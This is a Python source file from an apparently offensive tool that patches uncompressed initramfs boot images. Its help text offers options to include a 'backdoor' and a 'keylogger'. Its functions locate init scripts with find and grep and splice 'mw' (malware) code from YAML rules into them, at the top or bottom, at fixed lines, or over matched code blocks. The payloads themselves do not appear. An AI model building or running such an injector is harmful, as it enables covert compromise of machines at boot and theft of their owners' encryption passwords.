import re
from shutil import copyfile
from os.path import basename
from subprocess import CalledProcessError, check_output
from patcher import argv
from schema import Schema, Or, SchemaError

def usage():
    print("Usage: " + argv[0] + " [bech] <path to uncompressed initramfs>")

def printHelp():
    usage()
    print("\t-b,--exclude-backdoor\n"
          "\t\tdo not include backdoor\n"
          "\t-e,--exclude-encrypt\n"
          "\t\tdo not install keylogger\n"
          "\t-c, --config\n"
          "\t\tspecify a yaml configuration file. Default: patcher.yaml\n"
          "\t-h,--help\n"
          "\t\tprint this menu")

def injectFiles(rule, root):
    injected = []
    for file_to_copy in rule["copy"]:
        try:
            injected.append(basename(copyfile(file_to_copy, root + "/" + rule["dest"] + "/" + basename(file_to_copy))))
        except:
            pass
    return injected

def str2list(str_to_convert):
    str_converted = str_to_convert.split('\n')[:-1]
    for i in range(len(str_converted)):
        str_converted[i] = str_converted[i] + '\n'
    return str_converted

def tabFixer(rule, line_to_copy_indentation):
    count = 0
    first_char = line_to_copy_indentation[0] if type(line_to_copy_indentation) is str and len(line_to_copy_indentation) > 0 else ''
    while(count < len(line_to_copy_indentation) and re.match(r'[\t\f ]', line_to_copy_indentation[count])):
        count += 1
    mw_fixed = str2list(rule["mw"])
    if count > 0:
        for i in range(len(mw_fixed)):
            mw_fixed[i] = (first_char * count) + mw_fixed[i]
    return mw_fixed

def injectFixedLine(rule, txt_buff, line_number, line_to_copy_indentation=None):
    if line_to_copy_indentation is None:
        line_to_copy_indentation = line_number
    if line_number > len(txt_buff):
        return txt_buff, []
    if line_number > 0:
        mw_fixed = tabFixer(rule, txt_buff[line_to_copy_indentation])
    else:
        mw_fixed = str2list(rule["mw"])
    txt_buff_mw = txt_buff[:line_number] + mw_fixed + txt_buff[line_number:]
    return txt_buff_mw, [line_number + 1]

def injectHead(rule, txt_buff):
    return injectFixedLine(rule, txt_buff, 0)

def injectBottom(rule, txt_buff):
    return injectFixedLine(rule, txt_buff, len(txt_buff), len(txt_buff) - 1)

def overwriteLines(start, end, rule, txt_buff):
    txt_buff_cut = txt_buff[:start] + txt_buff[end:]
    return injectFixedLine(rule, txt_buff_cut, start, start - 1)

def injectStatically(rule, txt_buff):
    line_number = 0
    length_code = len(rule["original_code"].split('\n')) - 1
    while line_number <= len(txt_buff):
        if re.sub('\s', '', "".join(txt_buff[line_number: len(txt_buff) if line_number+length_code > len(txt_buff) else line_number+length_code ])) == re.sub('\s', '', rule["original_code"]):
            return overwriteLines(line_number, line_number+length_code, rule, txt_buff)
        line_number += 1
    return txt_buff, []

def injectDynamically(rule, txt_buff):
    line_number = 0
    max_length = rule["max_length"]
    if max_length > len(txt_buff): max_length = len(txt_buff)
    while line_number < len(txt_buff):
        if re.sub('\s', '', txt_buff[line_number]) == re.sub('\s', '', rule["start"]["line"]):
            start   = line_number
            stop    = line_number + 1
            frame   = txt_buff[start + 1: len(txt_buff) if start + max_length > len(txt_buff) else  start + max_length]
            for frame_line in frame:
                stop += 1
                if re.sub('\s', '', frame_line) == re.sub('\s', '', rule["end"]["line"]):
                    return overwriteLines(start, stop, rule, txt_buff)
                    break
        line_number += 1
    return txt_buff, []

def escapeGrep(str_to_convert):
    str_converted = re.sub('\$', '\\$', str_to_convert)
    #FIXME: se l'ultimo carattere è \ farci l'escape \\\\
    # cosa succede: find -O2 ../uncpio/archlinux -iregex ".*init" -type f -size -1024k -exec grep -Il "exec env -i \" '{}' +
    # come deve essere: find -O2 ../uncpio/archlinux -iregex ".*init" -type f -size -1024k -exec grep -Il "exec env -i \\\\" '{}' +
    str_converted = re.sub('\\\\"', '\\\\\\\\\\\\\\"', str_converted)
    return str_converted

def getTxtFiles(rule, src):
    # Get a list of vulnerable file, the ones which match the rules[rule] dict.
    # For optimization don't consider text files bigger than 1024Kb, you can play with -size switch to change behavior
    if "start" in rule:
        grep = " -exec grep -Il \"" + rule["start"]["line"] + "\" '{}' +"
    elif "original_code" in rule:
        grep = " -exec grep -Il \"" + rule["original_code"].split('\n')[0] + "\" '{}' +"
    else: # i leave grep as well for it's option -I which's able to fast skip all binary file
        grep = " -exec grep -Il \"\" '{}' +"
    grep = escapeGrep(grep)
    try:
         return check_output("find -O2 "+ src +" -iregex \"" + rule["name"] + "\" -type f -size -1024k" + grep,
            shell=True, universal_newlines=True).split('\n')[:-1]
    except:
        return []

def applayRule(rule, txt_buff=None):
    global src
    if "copy" in rule:
            rule_validate = Schema({  "rule_name": str,
                                        "copy": [],
                                        "dest": str}
                                    ).validate(rule)
            return "", injectFiles(rule_validate, src)
            # For return (string, list)

    if "head" in rule or "bottom" in rule:
        rule_validate = Schema({  "rule_name": str,
                                    "name": str,
                                    Or("head", "bottom"): bool,
                                    "mw": str}
                                ).validate(rule)
        if "head" in rule_validate and rule_validate["head"] is True:
            return injectHead(rule_validate, txt_buff)
        elif "bottom" in rule_validate and rule_validate["bottom"] is True:
            return injectBottom(rule_validate, txt_buff)

    elif "line_number" in rule:
        rule_validate = Schema({  "rule_name": str,
                                    "name": str,
                                    "line_number": int,
                                    "mw": str}
                                ).validate(rule)
        # Line number in list strats from zero
        return injectFixedLine(rule_validate, txt_buff, rule_validate["line_number"] - 1)

    elif "start" in rule:
        rule_validate = Schema({  "rule_name": str,
                                    "name": str,
                                    "start": {"line": str},
                                    "end": {"line": str},
                                    "mw": str,
                                    "max_length": int,
                                    "just_once": bool}
                                ).validate(rule)
        return injectDynamically(rule_validate, txt_buff)

    elif "original_code" in rule:
        rule_validate = Schema({  "rule_name": str,
                                    "name": str,
                                    "original_code": str,
                                    "mw": str,
                                    "just_once": bool}
                                ).validate(rule)
        return injectStatically(rule_validate, txt_buff)
